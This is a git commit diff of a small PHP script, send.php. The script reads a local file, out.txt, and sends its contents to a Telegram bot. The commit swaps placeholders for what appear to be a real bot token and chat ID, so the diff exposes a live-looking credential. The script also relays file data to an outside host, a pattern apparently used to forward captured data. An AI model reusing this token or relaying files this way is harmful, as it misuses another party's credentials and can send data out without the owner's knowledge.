a8ec5a0f155af36fd6651e8d24234f886043204c
wolfwild11 <63278772+wolfwild11@users.noreply.github.com>
2020-04-07 09:55:14 +0430

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot1266756643:AAFKy06v3rK4aaXXvnOfTC4Pa7Byk90KGeA/sendMessage?chat_id=979032880&text=$msg");
 ?>
